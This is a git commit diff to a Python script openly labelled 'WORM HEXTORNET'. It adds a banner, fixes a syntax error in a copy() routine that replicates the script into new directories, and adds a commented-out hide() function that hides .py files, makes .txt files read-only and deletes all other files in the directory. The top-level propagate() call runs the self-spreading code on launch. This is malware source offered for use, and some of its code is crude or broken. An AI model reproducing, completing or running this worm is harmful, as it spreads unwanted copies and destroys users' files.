1e00b14198a9b19fc2f78e9e69d60f16a2aa3098
Hector Torres <hectormtc@live.com>
2018-09-23 00:28:37 +0000

    Update hextornet.py

--- hextornet.py
+++ hextornet.py
@@ -11,6 +11,14 @@ from urllib2 import urlopen
 import subprocess as sp
 import shutil
 
+"""
+[==========================]
++                          +
++     WORM HEXTORNET       +
++                          +
+[==========================]
+"""
+
 def propagate():
 	#gets the current location of the worm
 	src = os.path.abspath("hextornet.py")
@@ -43,12 +51,28 @@ def propagate():
 
 def copy():
 	script = argv
-	name = str(script[0]
+	name = str(script[0])
 	b = os.path.getsize(os.path.abspath("C:"))
 	for i in range(0, 4):
 		directoryName = "copy"+str(i)
 		os.mkdir(directoryName)
 		shutil.copy(name, directoryName)
 		src = os.path.abspath(directoryName)
+
+"""
+def hide():
+        for fname in os.listdir('.'):
+                if fname.find('.py') == len(fname) - len('.py'):
+                        #make the file hidden
+                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_HIDDEN)
+                elif fname.find('.txt') == len(fname) - len('.txt'):
+                        #make the file read only
+                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_READONLY)
+                else:
+                        #to force deletion of a file set it to normal
+                        win32api.SetFileAttributes(fname, win32con.FILE_ATTRIBUTE_NORMAL)
+			os.remove(fname)
+
+"""
 
 propagate()
